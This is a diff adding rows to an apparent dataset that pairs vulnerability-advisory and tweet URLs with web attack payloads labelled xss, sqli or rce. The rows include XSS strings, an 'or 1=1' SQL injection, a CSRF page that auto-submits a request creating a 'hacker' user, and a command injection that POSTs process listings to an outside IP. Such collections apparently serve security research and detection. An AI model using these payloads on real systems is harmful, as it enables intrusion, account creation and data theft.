@@ -489,3 +489,6 @@ https://vulners.com/github/GHSA-H374-MM57-879C?utm_source=rss&utm_medium=rss&utm
 https://vulners.com/cve/CVE-2023-50094?utm_source=rss&utm_medium=rss&utm_campaign=rss,curl%2520-X%2520POST%2520--data%2520%22%24%28ps%2520-aux%29%22%2520192.168.1.91%2F%3F%60id%60,rce
 https://twitter.com/g1nk00/status/1735407588529913969,"&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;",xss
 https://twitter.com/TheMsterDoctor1/status/1743187595163501005,"&lt;dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x&gt;",xss
+https://vulners.com/github/GHSA-GP6M-FQ6H-CJCX?utm_source=rss&utm_medium=rss&utm_campaign=rss,"&lt;img src=x onerror=alert(1)&gt;.crt",xss
+https://vulners.com/cve/CVE-2024-1923?utm_source=rss&utm_medium=rss&utm_campaign=rss," 1337&#x27;+or+1=1;--+",sqli
+https://vulners.com/github/GHSA-PGPJ-V85Q-H5FM?utm_source=rss&utm_medium=rss&utm_campaign=rss,%26lt%3Bhtml%26gt%3B%20%26lt%3Bbody%26gt%3B%20%26lt%3Bform%20action%3D%22http%3A%2F%2Flocalhost%3A8000%2Fapi%2Fadd_user%2F%2522hacker%2522%2C%2522hacker%2522%22%26gt%3B%20%26lt%3Binput%20type%3D%22submit%22%20value%3D%22Submit%20request%22%20%2F%26gt%3B%20%26lt%3B%2Fform%26gt%3B%20%26lt%3Bscript%26gt%3B%20history.pushState%28%27%27%2C%20%27%27%2C%20%27%2F%27%29%3B%20document.forms%5B0%5D.submit%28%29%3B%20%26lt%3B%2Fscript%26gt%3B%20%26lt%3B%2Fbody%26gt%3B%20%26lt%3B%2Fhtml%26gt%3B,xss
